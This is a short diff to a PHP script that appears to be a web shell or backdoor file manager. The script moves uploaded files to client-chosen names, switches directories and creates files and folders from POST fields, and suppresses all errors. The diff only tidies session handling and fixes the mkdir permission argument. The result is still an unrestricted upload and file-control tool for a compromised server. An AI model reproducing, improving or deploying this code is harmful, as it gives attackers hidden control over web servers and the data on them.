@@ -215,8 +215,7 @@ if (move_uploaded_file($_FILES['drag']['tmp_name'], $_FILES['drag']['name']))
 			{
 				if (@opendir(trim($_POST['di']))) 
 				{
-			unset($_SESSION['d']);
-			$_SESSION['d'] = trim($_POST['di']);
+						$_SESSION['d'] = trim($_POST['di']);
 				}
 				else 
 				{
@@ -254,8 +253,7 @@ if (move_uploaded_file($_FILES['drag']['tmp_name'], $_FILES['drag']['name']))
 			$new =str_replace("//","/",$new);
 			if(@opendir($new))
 			{
-			unset($_SESSION['d']);
-			$_SESSION['d']=$new;
+				$_SESSION['d']=$new;
 			}
 			
 			}
@@ -295,7 +293,7 @@ file lo : <input type=file name=drag>
 error_reporting(0);	
 if(isset($_POST['dcreate']))
 {
-$result=mkdir(trim($_POST['dname']),'0755');	
+$result=mkdir(trim($_POST['dname']),0755);	
 	
 }
 if(isset($_POST['fcreate']))
